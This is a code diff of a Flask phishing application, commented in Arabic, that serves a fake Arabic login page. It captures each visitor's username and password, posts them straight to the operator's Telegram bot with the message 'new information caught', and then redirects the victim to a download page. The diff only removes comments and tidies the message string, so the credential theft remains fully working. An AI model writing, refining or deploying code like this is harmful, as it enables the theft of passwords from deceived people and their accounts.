@@ -4,34 +4,26 @@ from flask import Flask, redirect, render_template_string, request, url_for
 
 app = Flask(__name__)
 
-# جلب توكن البوت ومعرفك من إعدادات المنصة تلقائياً
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-# ضع معرف تلجرام الخاص بك هنا (Chat ID) لكي تصلك الرسائل عليه، أو سنستخرجه
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '')
 
 
-# 1. صفحة تسجيل الدخول (الصفحة الأولى)
-@app.route('/', methods=['GET', 'POST5'])
 @app.route('/', methods=['GET', 'POST'])
 def login():
   if request.method == 'POST':
-    # استقبال البيانات المدخلة من المستخدم
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # إرسال البيانات فوراً إلى بوت التليجرام الخاص بك
     if BOT_TOKEN and ADMIN_CHAT_ID:
       text = (
-          '🚨 تم صيد معلومات جديدة!\n👤 المدخل: '
-          f'{username}\n🔑 القيمة/الباسورد: {password}'
+          f'🚨 تم صيد معلومات جديدة!\n👤 المدخل: {username}\n🔑'
+          f' الباسورد: {password}'
       )
       url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
       requests.post(url, json={'chat_id': ADMIN_CHAT_ID, 'text': text})
 
-    # الانتقال لصفحة التنزيل بعد الضغط على تسجيل الدخول
     return redirect(url_for('download_page'))
 
-  # تصميم صفحة تسجيل الدخول باللغة العربية
   return '''
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -60,7 +52,6 @@ def login():
     '''
 
 
-# 2. صفحة التنزيل (تظهر بعد تسجيل الدخول مباشرة)
 @app.route('/download')
 def download_page():
   return '''
